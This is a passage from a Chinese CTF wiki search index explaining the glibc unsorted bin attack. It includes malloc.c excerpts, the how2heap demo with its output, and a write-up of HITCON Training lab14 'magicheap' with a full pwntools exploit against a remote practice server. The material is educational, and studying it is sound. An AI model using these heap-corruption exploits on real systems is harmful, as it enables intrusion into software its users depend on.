global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack \u4e86\u3002 HITCON Training lab14 magic heap \u00b6 \u9898\u76ee\u94fe\u63a5 \u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002\uff08buu \u4e0a\u7684\u9898\u76ee\u66ff\u6362\u4e3a\u4e86 /bin/sh \uff09 void l33t () { system ( \"cat ./flag\" ); } \u57fa\u672c\u4fe1\u606f \u00b6 \u279c hitcontraining_lab14 git: ( master ) file magicheap magicheap: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped \u279c hitcontraining_lab14 git: ( master ) checksec magicheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 64 \u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd \u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002 \u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002 \u5229\u7528 \u00b6 \u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002\u63a7\u5236 bk \u6307\u9488\u5411\u76ee\u6807\u5730\u5740\u5199\u5165\u4e00\u4e2a\u5927\u6570\u5b57\u3002 \u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002 \u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a &magic-16\u3002 \u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\uff08\u7533\u8bf7\uff09\u3002 EXP \u00b6 from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./magicheap\" ) p = remote ( \"node3.buuoj.cn\" , 25014 ) elf = ELF ( \"./magicheap\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size , content ): p . sendlineafter ( ':' , '1' ) p . sendlineafter ( ':' , str ( size )) p . sendafter ( ':' , content ) def edit ( id , size , content ): p . sendlineafter ( ':' , '2' ) p . sendlineafter ( ':' , str ( id )) p . sendlineafter ( ':' , str ( size )) p . sendafter ( ':' , content ) def free ( id ): p . sendlineafter ( ':' , '3' ) p . sendlineafter ( ':' , str ( id )) create ( 0x10 , 'a' ) create ( 0x80 , 'a' * 0x10 ) create ( 0x10 , 'a' * 0x10 ) free ( 1 ) payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x91 ) payload += p64 ( 0xdeadbeef ) + p64 ( 0x6020A0 - 0x10 ) #p64(0x06020C0-0x10) edit ( 0 , len ( payload ), payload ) create ( 0x80 , \"skye\" ) p . sendlineafter ( ':' , str ( 0x1305 )) # gdb.attach(p) p . interactive ()","title":"unsorted_bin_attack"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#unsorted-bin-attack","text":"","title":"Unsorted Bin Attack"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#_1","text":"Unsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002 Unsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002 Unsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002","title":"\u6982\u8ff0"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#unsorted-bin","text":"\u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002","title":"Unsorted Bin \u56de\u987e"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#_2","text":"\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002 \u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin \u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002","title":"\u57fa\u672c\u6765\u6e90"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#_3","text":"Unsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c \u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6 \u3002 \u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002","title":"\u57fa\u672c\u4f7f\u7528\u60c5\u51b5"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#_4","text":"\u5728 glibc / malloc / malloc.c \u4e2d\u7684 _int_malloc \u6709\u8fd9\u4e48\u4e00\u6bb5\u4ee3\u7801\uff0c\u5f53\u5c06\u4e00\u4e2a unsorted bin \u53d6\u51fa\u7684\u65f6\u5019\uff0c\u4f1a\u5c06 bck->fd \u7684\u4f4d\u7f6e\u5199\u5165\u672c Unsorted Bin \u7684\u4f4d\u7f6e\u3002 /* remove from unsorted list */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): corrupted unsorted chunks 3\" ); unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); \u6362\u800c\u8a00\u4e4b\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86 bk \u7684\u503c\uff0c\u6211\u4eec\u5c31\u80fd\u5c06 unsorted_chunks (av) \u5199\u5230\u4efb\u610f\u5730\u5740\u3002 \u8fd9\u91cc\u6211\u4ee5 shellphish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684 unsorted_bin_attack.c \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack \\n \" ); fprintf ( stderr , \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack \\n\\n \" ); unsigned long target_var = 0 ; fprintf ( stderr , \"Let's first look at the target we want to rewrite on stack: \\n \" ); fprintf ( stderr , \"%p: %ld \\n\\n \" , & target_var , target_var ); unsigned long * p = malloc ( 400 ); fprintf ( stderr , \"Now, we allocate first normal chunk on the heap at: %p \\n \" , p ); fprintf ( stderr , \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free() \\n\\n \" ); malloc ( 500 ); free ( p ); fprintf ( stderr , \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to %p \\n \" , ( void * ) p [ 1 ]); /*------------VULNERABILITY-----------*/ p [ 1 ] = ( unsigned long )( & target_var - 2 ); fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the \" \"victim->bk pointer \\n \" ); fprintf ( stderr , \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p \\n\\n \" , ( void * ) p [ 1 ]); //------------------------------------ malloc ( 400 ); fprintf ( stderr , \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite: \\n \" ); fprintf ( stderr , \"%p: %p \\n \" , & target_var , ( void * ) target_var ); } \u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a \u279c unsorted_bin_attack git:(master) \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack \u279c unsorted_bin_attack git:(master) \u2717 ./unsorted_bin_attack This file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let's first look at the target we want to rewrite on stack: 0x7ffe0d232518: 0 Now, we allocate first normal chunk on the heap at: 0x1fce010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002 \u521d\u59cb\u72b6\u6001\u65f6 unsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002 \u6267\u884c free(p) \u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002 \u4fee\u6539 p[1] \u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002 \u7533\u8bf7 400 \u5927\u5c0f\u7684 chunk \u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 chunk\uff0c\u6240\u4ee5\u4f1a\u53bb unsorted bin \u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002 while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ /* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { .... } /* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); victim = unsorted_chunks(av)->bk=p bck = victim->bk=p->bk = target addr-16 unsorted_chunks(av)->bk = bck=target addr-16 bck->fd = *(target addr -16+16) = unsorted_chunks(av); \u4e0a\u9762\u56db\u6b65\u5c31\u662f\u904d\u5386\u5bfb\u627e unsorted bin \u4e2d\u662f\u5426\u6709\u7b26\u5408\u7533\u8bf7\u5927\u5c0f\u7684 chunk \uff0c\u4e0a\u9762\u8fd9\u4e2a\u662f bin \u4e2d chunk \u5927\u5c0f\u5927\u4e8e\u7533\u8bf7 size + MINSIZE \u7684\u60c5\u51b5\u3002 \u524d\u9762\u4e24\u4e2a\u662f\u53d8\u91cf\u7684\u5b9a\u4e49\uff1avictim \u5f53\u524d\u5806\u3001bck \u540e\u4e00\u5757\u5806\uff1b \u540e\u9762\u662f\u904d\u5386\u5408\u9002 chunk \u4e4b\u540e unlink \u53d6\u51fa\u64cd\u4f5c\uff1a unsorted_chunks(av) \u524d\u4e00\u5757\u5806\u7684 bk \u6307\u9488\u6307\u5411\u540e\u4e00\u5757\u5806\u5757 bck \uff1b \u540e\u4e00\u5757\u5806\u5757 bck fd \u6307\u9488\u6307\u5411\u524d\u4e00\u5757\u5806\u5757 unsorted_chunks(av) \uff1b \u56db\u6b65\u4e2d victim fd \u4e00\u76f4\u6ca1\u6709\u88ab\u4f7f\u7528\u8fc7\uff1bbk \u6307\u9488\u5f71\u54cd bck\u3001bck->fd \u7684\u503c\u3002\u5982\u679c\u6211\u4eec\u80fd\u591f\u63a7\u5236 victim \u7684 bk \u6307\u9488\u5c31\u80fd\u5c06 unsorted_chunks(av) \u8fd9\u4e2a\u5730\u5740\u503c\u5199\u5230\u4efb\u610f\u5730\u5740\uff08\u539f\u56e0\u770b\u9762 unlink \u7684\u7b2c\u56db\u6b65\uff09 \uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a unsorted_chunks(av) \u7684\u5730\u5740\u503c\u4e3a\uff1a0x61616161 \uff0c\u60f3\u5c06\u5176\u5199\u5165\u5230 target_addr \u3002\u63a7\u5236 victim->bk \u4e3a\uff1atarget_addr - 16 \uff0c\u5f53\u8fdb\u884c unlink \u65f6\u4f1a\u6267\u884c\uff1abck->fd = *(target_addr -16+16) = unsorted_chunks(av); \uff0c\u6210\u529f\u5c06 0x61616161 \u5199\u5165\u5230 target_addr **\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002**\u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002 \u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002 We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4 \u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002\uff08\u4fee\u6539\u4efb\u610f\u5730\u5740\u5185\u5bb9\uff0c\u5185\u5bb9\u4e0d\u53ef\u63a7\uff09 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack \u4e86\u3002","title":"\u539f\u7406"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#hitcon-training-lab14-magic-heap","text":"\u9898\u76ee\u94fe\u63a5 \u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002\uff08buu \u4e0a\u7684\u9898\u76ee\u66ff\u6362\u4e3a\u4e86 /bin/sh \uff09 void l33t () { system ( \"cat ./flag\" ); }","title":"HITCON Training lab14 magic heap"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#_5","text":"\u279c hitcontraining_lab14 git: ( master ) file magicheap magicheap: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped \u279c hitcontraining_lab14 git: ( master ) checksec magicheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 64 \u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#_6","text":"\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd \u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002 \u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#_7","text":"\u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002\u63a7\u5236 bk \u6307\u9488\u5411\u76ee\u6807\u5730\u5740\u5199\u5165\u4e00\u4e2a\u5927\u6570\u5b57\u3002 \u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002 \u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a &magic-16\u3002 \u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\uff08\u7533\u8bf7\uff09\u3002","title":"\u5229\u7528"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/#exp","text":"from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./magicheap\" ) p = remote ( \"node3.buuoj.cn\" , 25014 ) elf = ELF ( \"./magicheap\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size , content ): p . sendlineafter ( ':' , '1' ) p . sendlineafter ( ':' , str ( size )) p . sendafter ( ':' , content ) def edit ( id , size , content ): p . sendlineafter ( ':' , '2' ) p . sendlineafter ( ':' , str ( id )) p . sendlineafter ( ':' , str ( size )) p . sendafter ( ':' , content ) def free ( id ): p . sendlineafter ( ':' , '3' ) p . sendlineafter ( ':' , str ( id )) create ( 0x10 , 'a' ) create ( 0x80 , 'a' * 0x10 ) create ( 0x10 , 'a' * 0x10 ) free ( 1 ) payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x91 ) payload += p64 ( 0xdeadbeef ) + p64 ( 0x6020A0 - 0x10 ) #p64(0x06020C0-0x10) edit ( 0 , len ( payload ), payload ) create ( 0x80 , \"skye\" ) p . sendlineafter ( ':' , str ( 0x1305 )) # gdb.attach(p) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/use_after_free/","text":"Use After Free \u00b6 \u539f\u7406 \u00b6 \u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48**\u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c**\u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c \u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898 \u3002 \u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684 Use After Free \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c \u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \u7684\u5185\u5b58\u6307\u9488\u4e3a dangling pointer\u3002 dangling pointer \uff1a 